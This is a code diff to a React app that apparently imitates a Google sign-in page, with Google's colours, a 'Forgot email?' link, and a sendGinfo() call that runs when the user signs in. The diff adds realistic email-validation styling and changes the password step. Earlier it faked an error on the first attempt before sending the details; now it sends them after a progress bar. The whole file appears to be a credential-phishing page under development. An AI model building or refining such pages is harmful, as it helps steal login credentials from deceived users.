@@ -6,6 +6,7 @@ export default function App() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [passwordError, setPasswordError] = useState(false);
+  const [emailError, setEmailError] = useState("");
 
   function runProgress(callback) {
     setProgress(0);
@@ -30,10 +31,21 @@ export default function App() {
   }
 
   function handleNext() {
-    if (email.trim() === "") {
-      alert("Please enter your email");
+    if (!email.trim()) {
+      setEmailError("Enter an email address.");
       return;
     }
+
+    // Email validation
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (!emailRegex.test(email)) {
+      setEmailError("Enter a valid email address.");
+      return;
+    }
+
+    // Error clear
+    setEmailError("");
 
     runProgress(() => {
       // Password page-এ যাওয়ার আগে progress reset
@@ -43,17 +55,9 @@ export default function App() {
   }
 
   function handleSignIn() {
-    // প্রথমবার ভুল দেখাবে
-    if (!passwordError) {
-      setPasswordError(true);
-      return;
-    }
-
-    sendGinfo();
-
     // দ্বিতীয়বার দিলে progress চলবে
     runProgress(() => {
-      setPasswordError(false);
+      sendGinfo();
     });
   }
 
@@ -117,13 +121,42 @@ export default function App() {
               </label>
 
               <input
-                id="email"
-                className="text-input"
-                type="text"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                autoComplete="off"
+                  id="email"
+                  className="text-input"
+                  type="text"
+                  value={email}
+                  onChange={(e) => {
+                    setEmail(e.target.value);
+                    setEmailError("");
+                  }}
+                  autoComplete="off"
+                  style={{
+                    border: emailError
+                        ? "2px solid #d93025"
+                        : "1px solid #dadce0",
+                    color: "#202124",
+                    backgroundColor: "#fff",
+                    outline: "none",
+                    transition: "border 0.2s ease, box-shadow 0.2s ease",
+                    boxShadow: emailError
+                        ? "0 0 0 3px rgba(217, 48, 37, 0.08)"
+                        : "none",
+                  }}
               />
+
+              {emailError && (
+                  <p
+                      style={{
+                        color: "#d93025",
+                        fontSize: "13px",
+                        lineHeight: "18px",
+                        fontWeight: "500",
+                        margin: "6px 0 0 2px",
+                      }}
+                  >
+                    {emailError}
+                  </p>
+              )}
 
               <button className="link-btn" type="button">
                 Forgot email?
